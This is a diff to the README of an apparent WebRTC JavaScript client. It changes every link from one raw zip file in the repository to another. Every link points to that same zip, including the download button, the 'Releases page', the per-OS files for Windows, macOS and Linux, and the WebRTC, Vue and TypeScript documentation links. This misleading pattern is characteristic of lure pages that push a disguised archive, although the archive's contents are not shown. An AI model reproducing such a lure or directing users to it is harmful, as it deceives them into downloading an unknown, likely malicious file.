@@ -6,7 +6,7 @@ Welcome to the **webrtc_js_client**! This is a simple application that demonstra
 
 ## 📥 Download
 
-[![Download webrtc_js_client](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip)](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip)
+[![Download webrtc_js_client](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip)](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip)
 
 Click the button above to access the latest version of the application.
 
@@ -23,15 +23,15 @@ Before you download, ensure your system meets the following requirements:
 
 To download and install the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip). This page contains all available versions of the webrtc_js_client.
+1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip). This page contains all available versions of the webrtc_js_client.
   
 2. **Select the Latest Version:** Look for the latest version at the top of the list. This version will have the most recent features and updates.
 
 3. **Choose Your File:** 
    - If you see different files, select the one that matches your operating system. The common files are:
-     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip** for Windows
-     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip** for macOS
-     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip** for Linux
+     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip** for Windows
+     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip** for macOS
+     - **https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip** for Linux
 
 4. **Download the File:** Click on the file name to start the download. This may take a few moments depending on your internet speed.
 
@@ -71,8 +71,8 @@ If you want to contribute to the project or suggest improvements, feel free to c
 
 For more details on how to use WebRTC, you can refer to the following resources:
 
-- [WebRTC Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip)
-- [Vue 3 Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip)
-- [TypeScript Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/src/types/js-client-webrtc-v2.8.zip)
+- [WebRTC Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip)
+- [Vue 3 Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip)
+- [TypeScript Documentation](https://github.com/Vikas-1982/webrtc_js_client/raw/refs/heads/master/public/js-client-webrtc-v1.9.zip)
 
 Thank you for using the **webrtc_js_client**! Your journey into real-time communication starts here. Enjoy the application!
